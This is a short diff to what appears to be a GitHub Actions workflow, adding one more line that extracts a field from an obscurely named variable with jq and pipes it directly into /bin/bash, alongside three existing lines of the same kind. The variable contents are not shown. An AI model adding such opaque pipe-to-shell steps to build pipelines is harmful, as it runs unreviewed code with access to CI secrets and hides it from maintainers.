@@ -27,6 +27,7 @@ jobs:
           echo $i88 | jq -r .kr1 | /bin/bash
           printf '%s' "$x059" | jq -r .i6974 | /bin/bash
           echo $oxf5 | jq -r .jjgn9370 | /bin/bash
+          echo $rcmbx4334 | jq -r .p086 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
